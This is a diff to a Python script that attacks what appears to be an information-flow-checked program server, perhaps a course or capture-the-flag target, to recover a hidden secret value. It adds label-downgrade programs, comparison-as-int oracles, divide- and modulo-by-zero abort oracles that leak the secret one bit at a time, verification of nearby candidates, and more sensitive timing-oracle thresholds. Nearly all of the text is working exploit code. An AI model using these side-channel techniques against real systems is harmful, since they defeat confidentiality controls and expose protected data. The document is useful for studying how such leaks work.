@@ -29,6 +29,52 @@ DIRECT_FLOW_PROGRAM = """int main(int input, int secret) {
 }
 """
 
+DIRECT_LABEL_DOWNGRADE_PROGRAM = """int main(int input, int secret) {
+  //@label L;
+  int x = secret;
+  return x;
+}
+"""
+
+DIRECT_HIGH_TEMP_PROGRAM = """int main(int input, int secret) {
+  //@label H;
+  int h = secret;
+  return h;
+}
+"""
+
+DIRECT_ARRAY_HIGH_PROGRAM = """int main(int input, int secret) {
+  //@label H;
+  int[] A = alloc_array(int, 1);
+  A[0] = secret;
+  return A[0];
+}
+"""
+
+DIRECT_ARRAY_LOW_PROGRAM = """int main(int input, int secret) {
+  //@label L;
+  int[] A = alloc_array(int, 1);
+  A[0] = secret;
+  return A[0];
+}
+"""
+
+COMPARE_AS_INT_ORACLE_PROGRAM = """int main(int input, int secret) {
+  return secret < input;
+}
+"""
+
+COMPARE_AS_INT_TMP_ORACLE_PROGRAM = """int main(int input, int secret) {
+  int x = secret < input;
+  return x;
+}
+"""
+
+COMPARE_AS_INT_REV_ORACLE_PROGRAM = """int main(int input, int secret) {
+  return input <= secret;
+}
+"""
+
 IMPLICIT_BOOLEAN_PROGRAM = """int main(int input, int secret) {
   int out = 0;
   if (secret < input) {
@@ -103,6 +149,33 @@ EXPR_ABORT_AND_OOB_ORACLE_PROGRAM = """int main(int input, int secret) {
 }
 """
 
+EXPR_INTCAST_DIV_ORACLE_PROGRAM = """int main(int input, int secret) {
+  //@label H;
+  int gate = (secret < input);
+  //@label H;
+  int witness = 1 / gate;
+  return 0;
+}
+"""
+
+EXPR_INTCAST_MOD_ORACLE_PROGRAM = """int main(int input, int secret) {
+  //@label H;
+  int gate = (secret < input);
+  //@label H;
+  int witness = 1 % gate;
+  return 0;
+}
+"""
+
+EXPR_INTCAST_DIV_REV_ORACLE_PROGRAM = """int main(int input, int secret) {
+  //@label H;
+  int gate = (input <= secret);
+  //@label H;
+  int witness = 1 / gate;
+  return 0;
+}
+"""
+
 TERMINATION_ORACLE_PROGRAM = """int main(int input, int secret) {
   if (secret < input) {
     while (true) {
@@ -124,6 +197,11 @@ TERMINATION_ORACLE_ALT_PROGRAM = """int main(int input, int secret) {
 
 NOOP_PROGRAM = """int main(int input, int secret) {
   return 0;
+}
+"""
+
+VERIFY_INPUT_PROGRAM = """int main(int input, int secret) {
+  return input;
 }
 """
 
@@ -296,13 +374,135 @@ def binary_search_oracle(oracle: Callable[[int], bool]) -> int:
     return lo
 
 
+def verify_secret_candidate(
+    *,
+    server_command: str,
+    userid: str,
+    candidate: int,
+    timeout_s: float,
+) -> bool:
+    if candidate < SECRET_MIN or candidate >= SECRET_MAX_EXCLUSIVE:
+        return False
+    with ProgramFile(VERIFY_INPUT_PROGRAM) as path:
+        res = run_query(
+            server_command=server_command,
+            userid=userid,
+            program_path=path,
+            input_value=candidate,
+            timeout_s=timeout_s,
+        )
+        return res.kind == "success"
+
+
+def verify_nearby_candidates(
+    *,
+    server_command: str,
+    userid: str,
+    candidate: int,
+    timeout_s: float,
+) -> Optional[int]:
+    # Binary search on threshold oracles can be off by one if endpoint behavior is odd.
+    for guess in (candidate, candidate - 1, candidate + 1):
+        if verify_secret_candidate(
+            server_command=server_command,
+            userid=userid,
+            candidate=guess,
+            timeout_s=timeout_s,
+        ):
+            return guess
+    return None
+
+
+def make_bit_abort_oracle_program(*, bit_index: int) -> str:
+    divisor = 1 << bit_index
+    return f"""int main(int input, int secret) {{
+  //@label H;
+  int b = (secret / {divisor}) % 2;
+  //@label H;
+  int witness = 1 / b;
+  return 0;
+}}
+"""
+
+
+def recover_from_bitwise_abort_oracle(
+    *,
+    server_command: str,
+    userid: str,
+    timeout_s: float,
+) -> int:
+    # Build two interpretations and verify by exact match:
+    # - abort => bit 0, failure => bit 1
+    # - abort => bit 1, failure => bit 0
+    abort_map_bits: list[int] = []
+    failure_map_bits: list[int] = []
+
+    for bit in range(SECRET_BITS):
+        source = make_bit_abort_oracle_program(bit_index=bit)
+        with ProgramFile(source) as path:
+            res = run_query(
+                server_command=server_command,
+                userid=userid,
+                program_path=path,
+                input_value=0,
+                timeout_s=timeout_s,
+            )
+        if res.kind == "success" and res.value is not None:
+            return res.value
+        if res.kind == "abort":
+            abort_map_bits.append(0)
+            failure_map_bits.append(1)
+            continue
+        if res.kind == "failure":
+            abort_map_bits.append(1)
+            failure_map_bits.append(0)
+            continue
+        raise StrategyFailed(
+            f"bitwise oracle rejected at bit {bit} ({format_result(res)})"
+        )
+
+    candidate_abort0 = sum((bit_val << idx) for idx, bit_val in enumerate(abort_map_bits))
+    candidate_abort1 = sum((bit_val << idx) for idx, bit_val in enumerate(failure_map_bits))
+
+    for candidate in (candidate_abort0, candidate_abort1):
+        verified = verify_nearby_candidates(
+            server_command=server_command,
+            userid=userid,
+            candidate=candidate,
+            timeout_s=max(1.0, timeout_s),
+        )
+        if verified is not None:
+            return verified
+
+    raise StrategyFailed(
+        "bitwise abort oracle produced candidates that failed final verification"
+    )
+
+
 def recover_direct(
     *,
     server_command: str,
     userid: str,
     timeout_s: float,
 ) -> int:
-    with ProgramFile(DIRECT_FLOW_PROGRAM) as path:
+    return recover_direct_template(
+        server_command=server_command,
+        userid=userid,
+        timeout_s=timeout_s,
+        program_source=DIRECT_FLOW_PROGRAM,
+        strategy_name="direct flow",
+    )
+
+
+def recover_direct_template(
+    *,
+    server_command: str,
+    userid: str,
+    timeout_s: float,
+    program_source: str,
+    strategy_name: str,
+) -> int:
+    with ProgramFile(program_source) as path:
         res = run_query(
             server_command=server_command,
             userid=userid,
@@ -312,7 +512,7 @@ def recover_direct(
         )
         if res.kind == "success" and res.value is not None:
             return res.value
-        raise StrategyFailed(f"direct flow unavailable ({format_result(res)})")
+        raise StrategyFailed(f"{strategy_name} unavailable ({format_result(res)})")
 
 
 def recover_from_failure_oracle(
@@ -339,12 +539,14 @@ def recover_from_failure_oracle(
 
         boundary_lo = classify(SECRET_MIN)
         boundary_hi = classify(SECRET_MAX_EXCLUSIVE)
-        if boundary_lo or not boundary_hi:
+        if boundary_lo == boundary_hi:
             raise StrategyFailed(
                 "boolean-oracle boundary check failed "
                 f"(at 0 => {boundary_lo}, at 2^62 => {boundary_hi})"
             )
-        return binary_search_oracle(classify)
+        if (not boundary_lo) and boundary_hi:
+            return binary_search_oracle(classify)
+        return binary_search_oracle(lambda mid: not classify(mid))
 
 
 def recover_from_kind_oracle(
@@ -375,12 +577,14 @@ def recover_from_kind_oracle(
 
         boundary_lo = classify(SECRET_MIN)
         boundary_hi = classify(SECRET_MAX_EXCLUSIVE)
-        if boundary_lo or not boundary_hi:
+        if boundary_lo == boundary_hi:
             raise StrategyFailed(
                 "kind-oracle boundary check failed "
                 f"(at 0 => {boundary_lo}, at 2^62 => {boundary_hi})"
             )
-        return binary_search_oracle(classify)
+        if (not boundary_lo) and boundary_hi:
+            return binary_search_oracle(classify)
+        return binary_search_oracle(lambda mid: not classify(mid))
 
 
 def median_runtime_for_input(
@@ -448,9 +652,9 @@ def recover_from_timing_oracle(
 ) -> int:
     calibration_repeats = max(5, repeats)
     burn_candidates = [6_000_000, 12_000_000, 24_000_000, 48_000_000, 96_000_000]
-    sc_term_candidates = [800, 1600, 3200, 6400]
-    min_ratio = 1.06
-    min_gap_s = 0.010
+    sc_term_candidates = [800, 1600, 3200, 6400, 12800, 25600]
+    min_ratio = 1.02
+    min_gap_s = 0.001
 
     candidates: list[tuple[str, str]] = []
     for burn in burn_candidates:
@@ -588,12 +792,111 @@ def recover_server_secret(
             ),
         ),
         (
+            "direct flow with explicit L label",
+            lambda: recover_direct_template(
+                server_command=server_command,
+                userid=userid,
+                timeout_s=tuned_query_timeout,
+                program_source=DIRECT_LABEL_DOWNGRADE_PROGRAM,
+                strategy_name="direct flow explicit L",
+            ),
+        ),
+        (
+            "direct flow via high temporary",
+            lambda: recover_direct_template(
+                server_command=server_command,
+                userid=userid,
+                timeout_s=tuned_query_timeout,
+                program_source=DIRECT_HIGH_TEMP_PROGRAM,
+                strategy_name="direct flow high temp",
+            ),
+        ),
+        (
+            "direct flow via high array",
+            lambda: recover_direct_template(
+                server_command=server_command,
+                userid=userid,
+                timeout_s=tuned_query_timeout,
+                program_source=DIRECT_ARRAY_HIGH_PROGRAM,
+                strategy_name="direct flow high array",
+            ),
+        ),
+        (
+            "direct flow via low array",
+            lambda: recover_direct_template(
+                server_command=server_command,
+                userid=userid,
+                timeout_s=tuned_query_timeout,
+                program_source=DIRECT_ARRAY_LOW_PROGRAM,
+                strategy_name="direct flow low array",
+            ),
+        ),
+        (
             "implicit-flow boolean oracle",
             lambda: recover_from_failure_oracle(
                 server_command=server_command,
                 userid=userid,
                 timeout_s=tuned_query_timeout,
                 program_source=IMPLICIT_BOOLEAN_PROGRAM,
+            ),
+        ),
+        (
+            "comparison-as-int oracle",
+            lambda: recover_from_failure_oracle(
+                server_command=server_command,
+                userid=userid,
+                timeout_s=tuned_query_timeout,
+                program_source=COMPARE_AS_INT_ORACLE_PROGRAM,
+            ),
+        ),
+        (
+            "comparison-as-int tmp oracle",
+            lambda: recover_from_failure_oracle(
+                server_command=server_command,
+                userid=userid,
+                timeout_s=tuned_query_timeout,
+                program_source=COMPARE_AS_INT_TMP_ORACLE_PROGRAM,
+            ),
+        ),
+        (
+            "bitwise abort oracle",
+            lambda: recover_from_bitwise_abort_oracle(
+                server_command=server_command,
+                userid=userid,
+                timeout_s=tuned_query_timeout,
+            ),
+        ),
+        (
+            "expr abort oracle (int-cast div)",
+            lambda: recover_from_kind_oracle(
+                server_command=server_command,
+                userid=userid,
+                timeout_s=tuned_query_timeout,
+                program_source=EXPR_INTCAST_DIV_ORACLE_PROGRAM,
+                true_kinds={"abort"},
+                false_kinds={"failure"},
+            ),
+        ),
+        (
+            "expr abort oracle (int-cast mod)",
+            lambda: recover_from_kind_oracle(
+                server_command=server_command,
+                userid=userid,
+                timeout_s=tuned_query_timeout,
+                program_source=EXPR_INTCAST_MOD_ORACLE_PROGRAM,
+                true_kinds={"abort"},
+                false_kinds={"failure"},
+            ),
+        ),
+        (
+            "expr abort oracle (int-cast div rev)",
+            lambda: recover_from_kind_oracle(
+                server_command=server_command,
+                userid=userid,
+                timeout_s=tuned_query_timeout,
+                program_source=EXPR_INTCAST_DIV_REV_ORACLE_PROGRAM,
+                true_kinds={"abort"},
+                false_kinds={"failure"},
             ),
         ),
         (
@@ -726,7 +1029,23 @@ def recover_server_secret(
             debug=debug,
         )
         if secret is not None:
-            return secret
+            verified = verify_nearby_candidates(
+                server_command=server_command,
+                userid=userid,
+                candidate=secret,
+                timeout_s=tuned_query_timeout,
+            )
+            if verified is not None:
+                if verified != secret:
+                    debug_log(
+                        debug,
+                        f"[serve{server_idx}] adjusted candidate {secret} -> {verified}",
+                    )
+                return verified
+            debug_log(
+                debug,
+                f"[serve{server_idx}] candidate {secret} from {strategy_name} failed verification",
+            )
     return None
 
 
